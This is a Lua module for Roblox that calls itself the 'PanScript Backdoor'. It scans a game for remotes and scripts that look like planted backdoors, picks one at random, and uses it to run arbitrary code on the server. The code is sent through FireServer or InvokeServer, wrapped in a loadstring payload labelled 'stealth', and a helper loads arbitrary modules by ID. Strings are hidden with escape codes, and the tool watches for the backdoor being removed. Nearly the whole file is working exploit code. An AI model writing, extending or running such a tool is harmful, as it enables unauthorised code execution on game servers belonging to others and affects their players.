local _bs = {}
_bs._a = false          -- Active state
_bs._selected = nil      -- Currently selected backdoor (only one)
_bs._backup = {}        -- Backup list of other backdoors
_bs._monitor = nil      -- Monitoring connection
_bs._r = {}             -- All found malicious remotes
_bs._n = {}             -- Normal remotes
_bs._m = {}             -- Infected models
_bs._s = tick()         -- Scan time
_bs._cb = nil           -- Callback

-- Configuration
local _cfg = {
    debug = false,
    stealth = true,
    maxScanDepth = 20,
    executionDelay = 0.05,
    monitorInterval = 2,  -- Check every 2 seconds
    autoReconnect = false   -- Don't auto-reconnect, just notify
}

-- Obfuscated strings
local _str = {
    loadstring = ("\108\111\97\100\115\116\114\105\110\103"),
    require = ("\114\101\113\117\105\114\101"),
    RemoteEvent = ("\82\101\109\111\116\101\69\118\101\110\116"),
    RemoteFunction = ("\82\101\109\111\116\101\70\117\110\99\116\105\111\110"),
}

-- Suspicious patterns
local _pat = {
    "loadstring%(%s*%)%(%)",
    "OnServerEvent%:Connect%(.-loadstring",
    "OnServerInvoke%s*=%s*function.-loadstring",
    "Instance%.new%([\"']RemoteEvent[\"'].-loadstring",
    "getfenv%(%s*%)%[%s*loadstring",
    "setfenv%(.-loadstring",
}

-- Remote categorization
local _cat = {
    normal = {"DataEvent", "UpdateEvent", "RequestEvent", "ResponseEvent", "PlayerEvent", "GameEvent", "Replicate", "Sync", "Remote", "Function", "Callback"},
    suspicious = {"Insert", "Loadstring", "HttpGet", "Run", "Execute", "Script", "Source", "Require", "Module", "Load", "Eval", "RunCode", "Backdoor", "Exploit", "Virus", "Infect"}
}

local function _log(m, t)
    t = t or "INFO"
    if _cfg.debug or t == "ERROR" or t == "FOUND" or t == "DISCONNECT" then
        print(("[BD:%s] %s"):format(t, m))
    end
    if _bs._cb then _bs._cb(m, t) end
end

local function _isSus(n)
    if not n then return false, 0 end
    n = tostring(n):lower()
    local s = 0
    for _, p in ipairs(_cat.suspicious) do
        if n:find(p:lower()) then s = s + 30 end
    end
    return s > 0, s
end

local function _isNormal(n)
    if not n then return false end
    n = tostring(n):lower()
    for _, p in ipairs(_cat.normal) do
        if n:find(p:lower()) then return true end
    end
    return false
end

-- Analyze script source
local function _analyzeScript(scr)
    if not scr or not scr:IsA("LuaSourceContainer") then return nil end
    
    local info = {
        Object = scr,
        Name = scr.Name,
        Path = scr:GetFullName(),
        SuspiciousPatterns = {},
        RiskScore = 0,
        IsBackdoor = false
    }
    
    local ok, src = pcall(function() return scr.Source end)
    
    if not ok or not src then
        local name = scr.Name:lower()
        if name:find("backdoor") or name:find("exploit") or name:find("virus") then
            info.RiskScore = 100
            info.IsBackdoor = true
            table.insert(info.SuspiciousPatterns, "suspicious_name")
        end
        return info.RiskScore > 50 and info or nil
    end
    
    for _, pattern in ipairs(_pat) do
        if src:find(pattern) then
            table.insert(info.SuspiciousPatterns, pattern)
            info.RiskScore = info.RiskScore + 40
        end
    end
    
    if src:find("Instance%.new%s*%(%s*[\"']Remote") then
        info.RiskScore = info.RiskScore + 50
        table.insert(info.SuspiciousPatterns, "dynamic_remote_creation")
    end
    
    if src:find("getfenv") or src:find("setfenv") then
        info.RiskScore = info.RiskScore + 30
        table.insert(info.SuspiciousPatterns, "env_manipulation")
    end
    
    info.IsBackdoor = info.RiskScore >= 60
    return info.RiskScore > 30 and info or nil
end

-- Scan instance tree
local function _scan(i, d)
    d = d or 0
    if d > _cfg.maxScanDepth then return {}, {}, {} end
    
    local rmt = {}
    local scr = {}
    local mdl = {}
    
    if i:IsA(_str.RemoteEvent) or i:IsA(_str.RemoteFunction) then
        local sus, score = _isSus(i.Name)
        local norm = _isNormal(i.Name)
        local cat = sus and "MALICIOUS" or (norm and "NORMAL" or "UNKNOWN")
        
        table.insert(rmt, {
            Object = i,
            Name = i.Name,
            Type = i.ClassName,
            Path = i:GetFullName(),
            Category = cat,
            RiskScore = score,
            Suspicious = sus,
            Parent = i.Parent,
            Depth = d,
            InstanceId = i:GetDebugId() -- Unique ID for tracking
        })
    end
    
    if i:IsA("Script") or i:IsA("LocalScript") or i:IsA("ModuleScript") then
        local analysis = _analyzeScript(i)
        if analysis then
            table.insert(scr, analysis)
        end
    end
    
    if i:IsA("Model") or i:IsA("Folder") then
        for _, desc in ipairs(i:GetDescendants()) do
            if desc:IsA("Script") and desc.RunContext == Enum.RunContext.Server then
                local n = tostring(desc.Name)
                if #n > 50 or n:find("[\128-\255]") or n:match("^%s+$") or not desc.Archivable then
                    table.insert(mdl, {Model = i, Script = desc, Reason = "hidden_server"})
                    break
                end
            end
        end
    end
    
    for _, c in ipairs(i:GetChildren()) do
        local cr, cs, cm = _scan(c, d + 1)
        for _, v in ipairs(cr) do table.insert(rmt, v) end
        for _, v in ipairs(cs) do table.insert(scr, v) end
        for _, v in ipairs(cm) do table.insert(mdl, v) end
    end
    
    return rmt, scr, mdl
end

-- Test remote vulnerability
local function _test(r, depth)
    if depth > 3 then return false, nil, 0 end
    
    local v = false
    local m = nil
    local c = r.RiskScore or 0
    
    local p = r.Parent
    if p then
        local pn = tostring(p.Name):lower()
        if pn:find("backdoor") or pn:find("exploit") or pn:find("virus") then
            v = true
            m = "infected_container"
            c = c + 50
        end
        
        if p:IsA("Model") then
            for _, d in ipairs(p:GetDescendants()) do
                if d:IsA("Script") then
                    local dn = tostring(d.Name)
                    if dn:sub(1,1) == "\0" or dn:find("\239\191\189") then
                        v = true
                        m = m or "hidden_script"
                        c = c + 40
                        r.InfectedModel = p
                        break
                    end
                end
            end
        end
    end
    
    if r.Category == "MALICIOUS" then
        v = true
        m = m or "categorized_malicious"
        c = c + 30
    end
    
    local ok, attrs = pcall(function()
        return r.Object:GetAttribute("Backdoor") or r.Object:GetAttribute("Exploit")
    end)
    if ok and attrs then
        v = true
        m = m or "marked_attribute"
        c = c + 100
    end
    
    return v, m, c
end

-- Select ONE random backdoor from list
local function _selectRandomBackdoor(backdoors)
    if #backdoors == 0 then return nil end
    if #backdoors == 1 then return backdoors[1], {} end
    
    -- Random selection
    local selectedIndex = math.random(1, #backdoors)
    local selected = backdoors[selectedIndex]
    
    -- Create backup list (all except selected)
    local backup = {}
    for i, bd in ipairs(backdoors) do
        if i ~= selectedIndex then
            table.insert(backup, bd)
        end
    end
    
    return selected, backup
end

-- Monitor selected backdoor for removal/modification
local function _startMonitoring()
    if _bs._monitor then
        _bs._monitor:Disconnect()
        _bs._monitor = nil
    end
    
    if not _bs._selected or not _bs._selected.Object then
        _log("No backdoor to monitor", "WARN")
        return
    end
    
    local target = _bs._selected.Object
    local parent = target.Parent
    local name = target.Name
    local path = _bs._selected.Path
    
    _log("Starting monitoring for: " .. path, "MONITOR")
    
    -- Heartbeat-based monitoring
    local lastCheck = tick()
    _bs._monitor = game:GetService("RunService").Heartbeat:Connect(function()
        if tick() - lastCheck < _cfg.monitorInterval then return end
        lastCheck = tick()
        
        -- Check if object still exists
        local exists = pcall(function()
            return target.Parent and target.Name
        end)
        
        if not exists then
            _log("BACKDOOR_REMOVED: " .. path, "DISCONNECT")
            _bs.Disconnect()
            return
        end
        
        -- Check if parent changed (moved)
        if target.Parent ~= parent then
            _log("BACKDOOR_MOVED: " .. path, "DISCONNECT")
            _bs.Disconnect()
            return
        end
        
        -- Check if name changed (renamed)
        if target.Name ~= name then
            _log("BACKDOOR_RENAMED: " .. path .. " -> " .. target.Name, "DISCONNECT")
            _bs.Disconnect()
            return
        end
    end)
end

-- Stop monitoring
local function _stopMonitoring()
    if _bs._monitor then
        _bs._monitor:Disconnect()
        _bs._monitor = nil
        _log("Monitoring stopped", "MONITOR")
    end
end

-- Undetectable execution on SINGLE backdoor
local function _undetectableExec(code)
    if not _bs._selected then
        _log("No backdoor selected", "ERROR")
        return false
    end
    
    local r = _bs._selected.Object
    local t = _bs._selected.Type
    
    -- Verify still exists
    local exists = pcall(function() return r.Parent end)
    if not exists then
        _log("Backdoor no longer exists!", "ERROR")
        _bs.Disconnect()
        return false
    end
    
    -- Stealth execution methods
    local function method1()
        if t == _str.RemoteEvent then
            pcall(function() r:FireServer(code) end)
        else
            pcall(function() r:InvokeServer(code) end)
        end
    end
    
    local function method4()
        local payload = ([[
            local _c = "%s"
            local _f = loadstring or load
            if _f then pcall(_f, _c) end
        ]]):format(code:gsub("\"", "\\\""))
        
        if t == _str.RemoteEvent then
            pcall(function() r:FireServer(payload) end)
        else
            pcall(function() r:InvokeServer(payload) end)
        end
    end
    
    if _cfg.stealth then
        return pcall(method4) or pcall(method1)
    else
        return pcall(method1)
    end
end

-- Main scan function
function _bs.Scan()
    _log("Starting stealth scan...", "SCAN")
    _bs._r = {}
    _bs._n = {}
    _bs._m = {}
    _bs._selected = nil
    _bs._backup = {}
    _bs._s = tick()
    
    local services = {
        game:GetService("ReplicatedStorage"),
        game:GetService("ReplicatedFirst"),
        game:GetService("StarterGui"),
        game:GetService("StarterPack"),
        game:GetService("StarterPlayer"),
        workspace
    }
    
    local allR = {}
    local allS = {}
    local allM = {}
    
    for _, svc in ipairs(services) do
        local ar, as, am = _scan(svc)
        for _, v in ipairs(ar) do table.insert(allR, v) end
        for _, v in ipairs(as) do table.insert(allS, v) end
        for _, v in ipairs(am) do table.insert(allM, v) end
    end
    
    _log(("Found %d remotes, %d suspicious scripts"):format(#allR, #allS), "SCAN")
    
    -- Categorize remotes
    for _, r in ipairs(allR) do
        if r.Category == "NORMAL" then
            table.insert(_bs._n, r)
        else
            local isV, method, conf = _test(r)
            if isV then
                r.Vulnerable = true
                r.ExecutionMethod = method
                r.Confidence = conf
                table.insert(_bs._r, r)
            else
                table.insert(_bs._n, r)
            end
        end
    end
    
    -- Add script-based backdoors
    for _, s in ipairs(allS) do
        if s.IsBackdoor then
            table.insert(_bs._r, {
                Object = s.Object,
                Name = s.Name,
                Type = "ScriptBackdoor",
                Path = s.Path,
                Category = "MALICIOUS",
                Vulnerable = true,
                ExecutionMethod = "script_source",
                Confidence = s.RiskScore,
                ScriptInfo = s,
                InstanceId = s.Object:GetDebugId()
            })
        end
    end
    
    -- SELECT ONLY ONE RANDOM BACKDOOR
    if #_bs._r > 0 then
        local selected, backup = _selectRandomBackdoor(_bs._r)
        _bs._selected = selected
        _bs._backup = backup
        
        _log(("Selected 1 backdoor (from %d total): %s [%d%%]"):format(#_bs._r, selected.Path, selected.Confidence), "SELECT")
        
        if #backup > 0 then
            _log(("Backup list: %d other backdoors available"):format(#backup), "BACKUP")
        end
    end
    
    for _, m in ipairs(allM) do
        table.insert(_bs._m, m)
    end
    
    return _bs._selected ~= nil, #_bs._n
end

-- Execute through SINGLE selected backdoor
function _bs.Execute(code)
    if not _bs._a or not _bs._selected then
        _log("Backdoor not active", "ERROR")
        return false
    end
    
    _log("Executing through selected backdoor...", "EXEC")
    return _undetectableExec(code)
end

-- Require through backdoor
function _bs.Require(mid)
    if type(mid) == "number" then mid = tostring(mid) end
    local c = ([[
        local s,r=pcall(function()local m=require(%s)return m end)
        if s then print("[BD] Loaded:",r)return r else warn("[BD] Fail:",r)end
    ]]):format(mid)
    return _bs.Execute(c)
end

-- Initialize
function _bs.Initialize(cb, cfg)
    _bs._cb = cb
    if cfg then for k,v in pairs(cfg) do _cfg[k] = v end end
    _log("PanScript Backdoor initialized (Single Mode)", "INIT")
    return _bs
end

-- Activate (with monitoring)
function _bs.Activate()
    if _bs._selected then
        _bs._a = true
        print(("PANS_BACKDOOR_ACTIVE:1:%s:%s"):format(_bs._selected.Path, _bs._selected.Type))
        print(("PANS_BACKDOOR_SELECTED:%s:%s:%s"):format(_bs._selected.Path, _bs._selected.Type, _bs._selected.ExecutionMethod or "direct"))
        
        -- Start monitoring
        _startMonitoring()
        
        _log("Backdoor active and monitored", "ACTIVE")
        return true
    end
    _log("No backdoor selected", "ERROR")
    return false
end

-- Disconnect from backdoor
function _bs.Disconnect()
    _stopMonitoring()
    _bs._a = false
    local oldPath = _bs._selected and _bs._selected.Path or "unknown"
    _bs._selected = nil
    print("PANS_BACKDOOR_DISCONNECTED:" .. oldPath)
    _log("Disconnected from backdoor: " .. oldPath, "DISCONNECT")
end

-- Get status
function _bs.GetStatus()
    return {
        Active = _bs._a,
        HasSelection = _bs._selected ~= nil,
        SelectedPath = _bs._selected and _bs._selected.Path or nil,
        BackupCount = #_bs._backup,
        NormalRemotes = #_bs._n,
        ScanTime = tick() - _bs._s
    }
end

-- Get selected backdoor info
function _bs.GetSelected()
    return _bs._selected
end

-- Get backup list
function _bs.GetBackups()
    return _bs._backup
end

return _bs
